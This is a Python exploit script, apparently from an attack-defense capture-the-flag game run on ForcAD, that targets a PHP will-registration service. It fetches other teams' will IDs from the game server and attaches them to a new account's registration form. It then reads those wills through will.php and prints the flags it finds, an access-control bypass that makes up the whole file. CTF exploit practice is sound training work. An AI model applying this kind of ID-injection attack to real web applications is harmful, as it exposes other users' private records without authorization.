import requests
import checklib
import sys
import random
import json
import re

regex = re.compile('[A-Z0-9]{31}=')
ALPH = [chr(i) for i in range(65, 65 + 26)] + [chr(i) for i in range(97, 97 + 26)]
session = requests.Session()

ip = sys.argv[1]
forcad_ip = '127.0.0.1' # ForcAD address

def random_chars():    
    return checklib.rnd_string(10, ALPH)

def get_attack_data():
    data = requests.get(f"http://{forcad_ip}/api/client/attack_data").text
    data = json.loads(data)['zaveschalka'][ip]

    will_ids = []
    for attack in data:
        will_ids.append(json.loads(attack)["will_id"])

    return will_ids

def register(session: requests.Session, will_ids: list[str]):
    data = {
            "login": random_chars(),
            "password": random_chars(),
            "email": f"{random_chars()}@{random_chars()}.{random_chars()}",
            "phone": random.randint(100, 200)
    }
    for i in range(len(will_ids)):
        data[f"wills[{i}]"] = will_ids[i]

    session.post(f'http://{ip}:1782/register.php', data=data)

def get_flags(session: requests.Session, will_ids: list[str]):    
    for will_id in will_ids:
        req = session.get(f"http://{ip}:1782/will.php?id={will_id}")
        print(regex.findall(req.text)[0])

will_ids = get_attack_data()

register(session, will_ids)

get_flags(session, will_ids)